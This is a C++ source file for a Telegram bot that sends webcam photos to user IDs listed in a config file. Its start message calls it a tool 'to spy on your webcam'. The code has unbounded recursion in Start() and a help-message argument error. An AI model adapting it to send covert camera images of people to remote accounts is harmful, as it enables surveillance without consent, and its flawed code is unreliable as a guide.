#include "TelegramBot.hpp"

#include <libconfig.h++>

#include "windows_console.hpp"

namespace tg_bot
{
	TelegramBot::TelegramBot(const std::string& token) : bot(token)
	{
		bot.getEvents().onCommand("start", [this](TgBot::Message::Ptr message)
			{
				handleStartCommand(message);
			});

		bot.getEvents().onCommand("config", [this](TgBot::Message::Ptr message)
			{
				handleConfigCommand(message);
			});
		bot.getEvents().onCommand("ping_history", [this](TgBot::Message::Ptr message)
			{
				handlePingHistoryCommand(message);
			});
		bot.getEvents().onCommand("devoloper_info", [this](TgBot::Message::Ptr message)
			{
				handleDevoloperInfoCommand(message);
			});
		bot.getEvents().onCommand("help", [this](TgBot::Message::Ptr message)
			{
				handleHelpCommand(message);
			});
	}

	void TelegramBot::Start()
	{
		Console c;
		try
		{
			while (!BotRunValue::run)
			{
				std::this_thread::sleep_for(std::chrono::seconds(1));
				std::cout << "Wait On" << std::endl;
			}

			std::cout << "Exit wait loop" << std::endl;

			while (BotRunValue::run)
			{
				printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
				bot.getApi().deleteWebhook();

				TgBot::TgLongPoll longPoll(bot);

				while (true)
				{
					printf("Long poll started\n");
					longPoll.start();
				}
			}
		}
		catch (TgBot::TgException& ex)
		{
			printf("Error: %s\n", ex.what());
		}

		Start();
	}

	void TelegramBot::PingUsersWithPhoto(const std::string& photoFilePath)
	{
		std::thread([this, photoFilePath]()
			{
				std::ifstream photoFile(photoFilePath, std::ios::binary);

				if (!photoFile)
				{
					printf("Failed to open photo file: %s\n", photoFilePath.c_str());
					return;
				}

				for (const auto& userId : userIds)
				{
					try
					{
						bot.getApi().sendPhoto(userId, TgBot::InputFile::fromFile(photoFilePath, "image/jpeg"));
					}
					catch (TgBot::TgException& ex)
					{
						printf("Error sending photo to user %s: %s\n", userId.c_str(), ex.what());
					}
				}
			}).detach();
	}

	void TelegramBot::addUserId(const std::string& userId)
	{
		userIds.push_back(userId);
	}

	void TelegramBot::handleStartCommand(TgBot::Message::Ptr message)
	{
		bot.getApi().sendMessage(message->chat->id, "👋 Hi, this telegram bot is designed to spy on your webcam, "
			"you can customize the telegram token "
			"and the list of accounts to notify in a special software ⚙️");
	}

	void TelegramBot::handleConfigCommand(TgBot::Message::Ptr message)
	{
		bot.getApi().sendMessage(message->chat->id, "Placeholder 2");
	}

	void TelegramBot::handlePingHistoryCommand(TgBot::Message::Ptr message)
	{
		bot.getApi().sendMessage(message->chat->id, "Placeholder 3");
	}

	void TelegramBot::handleDevoloperInfoCommand(TgBot::Message::Ptr message)
	{
		bot.getApi().sendMessage(message->chat->id, "Placeholder 4");
	}

	void TelegramBot::handleHelpCommand(TgBot::Message::Ptr message)
	{
		bot.getApi().sendMessage(message->chat->id, 
			"🔹 /help - commands\n"
			"🔹 /start - Start Text\n"
			"🔹 /config - Config Info\n"
			"🔹 /ping_history - View a person's appearance history on the webcam\n",
			"🔹 /devoloper_info - Developer information\n");
	}

	void TelegramBot::loadConfigFromFile(const std::string& configFile)
	{
		libconfig::Config cfg;

		try
		{
			cfg.readFile(configFile.c_str());
			const libconfig::Setting& root = cfg.getRoot();

			const libconfig::Setting& userIdsSetting = root["user_ids"];
			for (int i = 0; i < userIdsSetting.getLength(); ++i)
			{
				std::string userId;
				if (userIdsSetting[i].lookupValue("", userId))
				{
					userIds.push_back(userId);
				}
			}
		}
		catch (const libconfig::FileIOException& ex)
		{
			printf("Error reading config file: %s\n", ex.what());
		}
		catch (const libconfig::ParseException& ex)
		{
			printf("Error parsing config file: %s\n", ex.getError());
		}
		catch (const libconfig::SettingNotFoundException& ex)
		{
			printf("Error accessing setting in config file: %s\n", ex.getPath());
		}
	}
}